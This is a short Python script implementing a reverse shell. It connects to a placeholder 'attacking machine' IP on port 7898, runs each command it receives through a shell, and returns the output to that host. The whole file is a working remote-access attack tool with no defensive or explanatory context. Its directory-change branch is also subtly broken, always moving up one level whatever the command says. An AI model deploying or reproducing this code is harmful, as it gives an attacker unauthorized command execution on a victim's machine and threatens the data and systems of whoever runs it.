import socket
import sys
import subprocess
import os


def main():
    ip = "192.168.0.0" #This is the Ip address of your attacking machine
    port = 7898
    connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connection.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    connection.connect((ip,port))
    print("Connection successful")
    
    while True:
        command = connection.recv(1024)
        command = command.decode('latin1')
        
        if command == 'exit':
            connection.close()
            break
        
        elif command[:2] == 'cd':
            os.chdir(b'..')
            connection.send(b'Ok')
        
        else:
            process = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output = process.stdout.read()+process.stderr.read()
            connection.send(output)
   
        

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()